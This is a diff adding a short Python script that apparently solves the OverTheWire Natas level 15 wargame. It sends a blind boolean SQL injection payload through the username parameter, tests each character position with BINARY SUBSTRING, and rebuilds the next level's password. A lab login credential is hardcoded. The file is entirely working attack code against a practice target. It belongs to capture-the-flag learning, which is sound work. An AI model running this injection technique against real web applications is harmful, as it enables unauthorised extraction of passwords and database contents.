@@ -1,0 +1,20 @@
+import requests
+import string 
+
+url = "http://natas15.natas.labs.overthewire.org/"
+auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+
+charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
+found = ""
+print("Starting the brute forcing")
+for i in range(1, 33):
+    for c in charset:
+        payload = f'natas16" AND BINARY SUBSTRING(password, {i}, 1)="{c}" -- ' 
+        r = requests.get(url, params={"username": payload}, auth=auth)
+        if "This user exists" in r.text:
+            found += c 
+            print(found)
+            break
+print("The password is:", found)
+
+
